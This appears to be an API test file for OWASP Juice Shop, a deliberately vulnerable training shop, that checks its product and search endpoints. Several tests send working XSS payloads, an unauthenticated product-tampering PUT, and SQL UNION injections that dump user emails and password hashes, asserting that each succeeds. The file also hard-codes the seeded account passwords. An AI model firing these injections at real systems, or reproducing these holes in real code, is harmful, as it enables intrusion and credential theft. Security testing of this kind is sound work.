const frisby = require('frisby')
const Joi = frisby.Joi
var insecurity = require('../../lib/insecurity')
var config = require('config')

var christmasProduct = config.get('products').filter(function (product) {
  return product.useForChristmasSpecialChallenge
})[0]

var tamperingProductId = (function () {
  var products = config.get('products')
  for (var i = 0; i < products.length; i++) {
    if (products[i].useForProductTamperingChallenge) {
      return i + 1
    }
  }
}())

const API_URL = 'http://localhost:3000/api'
const REST_URL = 'http://localhost:3000/rest'

var authHeader = { 'Authorization': 'Bearer ' + insecurity.authorize(), 'content-type': 'application/json' }
var jsonHeader = { 'content-type': 'application/json' }

describe('/api/Products', function () {
  it('GET all products', function (done) {
    frisby.get(API_URL + '/Products')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('jsonTypes', 'data.*', {
        id: Joi.number(),
        name: Joi.string(),
        description: Joi.string(),
        price: Joi.number(),
        image: Joi.string()
      }).done(done)
  })

  it('POST new product is forbidden via public API', function (done) {
    frisby.post(API_URL + '/Products', {
      name: 'Dirt Juice (1000ml)',
      description: 'Made from ugly dirt.',
      price: 0.99,
      image: 'dirt_juice.jpg'
    })
      .expect('status', 401)
      .done(done)
  })

  it('POST new product does not filter XSS attacks', function (done) {
    frisby.post(API_URL + '/Products', {
      headers: authHeader,
      body: {
        name: 'XSS Juice (42ml)',
        description: '<script>alert("XSS3")</script>',
        price: 9999.99,
        image: 'xss3juice.jpg'
      }
    })
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data', { description: '<script>alert("XSS3")</script>' })
      .done(done)
  })
})

describe('/api/Products/:id', function () {
  it('GET existing product by id', function (done) {
    frisby.get(API_URL + '/Products/1')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('jsonTypes', 'data', {
        id: Joi.number(),
        name: Joi.string(),
        description: Joi.string(),
        price: Joi.number(),
        image: Joi.string(),
        createdAt: Joi.string(),
        updatedAt: Joi.string()
      })
      .expect('json', 'data', { id: 1 })
      .done(done)
  })

  it('GET non-existing product by id', function (done) {
    frisby.get(API_URL + '/Products/4711')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data', {})
      .done(done)
  })

  it('PUT update existing product is possible due to Missing Function-Level Access Control vulnerability', function (done) {
    frisby.put(API_URL + '/Products/' + tamperingProductId, {
      header: jsonHeader,
      body: {
        description: '<a href="http://kimminich.de" target="_blank">More...</a>'
      }
    })
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data', { description: '<a href="http://kimminich.de" target="_blank">More...</a>' })
      .done(done)
  })

  it('PUT update existing product does not filter XSS attacks', function (done) {
    frisby.put(API_URL + '/Products/1', {
      header: jsonHeader,
      body: {
        description: "<script>alert('XSS3')</script>"
      }
    })
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data', { description: "<script>alert('XSS3')</script>" })
      .done(done)
  })

  it('DELETE existing product is forbidden via public API', function (done) {
    frisby.del(API_URL + '/Products/1')
      .expect('status', 401)
      .done(done)
  })

  it('DELETE existing product is forbidden via API even when authenticated', function (done) {
    frisby.del(API_URL + '/Products/1', { headers: authHeader })
      .expect('status', 401)
      .done(done)
  })
})

describe('/rest/product/search', function () {
  it('GET product search with no matches returns no products', function (done) {
    frisby.get(REST_URL + '/product/search?q=nomatcheswhatsoever')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(function (res) {
        expect(res.json.data.length).toBe(0)
      })
      .done(done)
  })

  it('GET product search with one match returns found product', function (done) {
    frisby.get(REST_URL + '/product/search?q=o-saft')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(function (res) {
        expect(res.json.data.length).toBe(1)
      })
      .done(done)
  })

  it('GET product search with XSS attack is not blocked', function (done) {
    frisby.get(REST_URL + '/product/search?q=<script>alert("XSS1")</script>')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .done(done)
  })

  it('GET product search fails with error message that exposes ins SQL Injection vulnerability', function (done) {
    frisby.get(REST_URL + '/product/search?q=\';')
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', '<h1>Juice Shop (Express ~')
      .expect('bodyContains', 'SQLITE_ERROR: near &quot;;&quot;: syntax error')
      .done(done)
  })

  it('GET product search SQL Injection fails from two missing closing parenthesis', function (done) {
    frisby.get(REST_URL + '/product/search?q=\' union select null,id,email,password,null,null,null from users--')
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', '<h1>Juice Shop (Express ~')
      .expect('bodyContains', 'SQLITE_ERROR: near &quot;union&quot;: syntax error')
      .done(done)
  })

  it('GET product search SQL Injection fails from one missing closing parenthesis', function (done) {
    frisby.get(REST_URL + '/product/search?q=\') union select null,id,email,password,null,null,null from users--')
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', '<h1>Juice Shop (Express ~')
      .expect('bodyContains', 'SQLITE_ERROR: near &quot;union&quot;: syntax error')
      .done(done)
  })

  it('GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns', function (done) {
    frisby.get(REST_URL + '/product/search?q=\')) union select * from users--')
      .expect('status', 500)
      .expect('header', 'content-type', /text\/html/)
      .expect('bodyContains', '<h1>Juice Shop (Express ~')
      .expect('bodyContains', 'SQLITE_ERROR: SELECTs to the left and right of UNION do not have the same number of result columns', function (done) {})
      .done(done)
  })

  it('GET product search can create UNION SELECT with Users table and fixed columns', function (done) {
    frisby.get(REST_URL + '/product/search?q=\')) union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\' from users--')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data.?', {
        id: '1',
        name: '2',
        description: '3',
        price: '4',
        image: '5',
        createdAt: '6',
        updatedAt: '7'
      }).done(done)
  })

  it('GET product search can create UNION SELECT with Users table and required columns', function (done) {
    frisby.get(REST_URL + '/product/search?q=\')) union select null,id,email,password,null,null,null,null from users--')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .expect('json', 'data.?', {
        name: 1,
        description: 'admin@' + config.get('application.domain'),
        price: insecurity.hash('admin123')
      })
      .expect('json', 'data.?', {
        name: 2,
        description: 'jim@' + config.get('application.domain'),
        price: insecurity.hash('ncc-1701')
      })
      .expect('json', 'data.?', {
        name: 3,
        description: 'bender@' + config.get('application.domain'),
        price: /[a-f0-9]{32}/ // match any MD5 hash as Bender's password might have been changed by a concurrent test
      })
      .expect('json', 'data.?', {
        name: 4,
        description: 'bjoern.kimminich@googlemail.com',
        price: insecurity.hash('YmpvZXJuLmtpbW1pbmljaEBnb29nbGVtYWlsLmNvbQ==')
      })
      .expect('json', 'data.?', {
        name: 5,
        description: 'ciso@' + config.get('application.domain'),
        price: insecurity.hash('mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb')
      })
      .expect('json', 'data.?', {
        name: 6,
        description: 'support@' + config.get('application.domain'),
        price: insecurity.hash('J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P')
      })
      .done(done)
  })

  it('GET product search cannot select logically deleted christmas special by default', function (done) {
    frisby.get(REST_URL + '/product/search?q=seasonal%20special%20offer')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(function (res) {
        expect(res.json.data.length).toBe(0)
      })
      .done(done)
  })

  it('GET product search by description cannot select logically deleted christmas special due to forced early where-clause termination', function (done) {
    frisby.get(REST_URL + '/product/search?q=seasonal%20special%20offer\'))--')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(function (res) {
        expect(res.json.data.length).toBe(0)
      })
      .done(done)
  })

  it('GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause', function (done) {
    frisby.get(REST_URL + '/product/search?q=' + christmasProduct.name + '\'))--')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(function (res) {
        expect(res.json.data.length).toBe(1)
        expect(res.json.data[0].name).toBe(christmasProduct.name)
      })
      .done(done)
  })

  it('GET product search with empty search parameter returns all products', function (done) {
    frisby.get(API_URL + '/Products')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(function (res) {
        var products = res.json.data
        return frisby.get(REST_URL + '/product/search?q=')
          .expect('status', 200)
          .expect('header', 'content-type', /application\/json/)
          .then(function (res) {
            expect(res.json.data.length).toBe(products.length)
          })
      }).done(done)
  })

  it('GET product search without search parameter returns all products', function (done) {
    frisby.get(API_URL + '/Products')
      .expect('status', 200)
      .expect('header', 'content-type', /application\/json/)
      .then(function (res) {
        var products = res.json.data
        return frisby.get(REST_URL + '/product/search')
          .expect('status', 200)
          .expect('header', 'content-type', /application\/json/)
          .then(function (res) {
            expect(res.json.data.length).toBe(products.length)
          })
      }).done(done)
  })
})
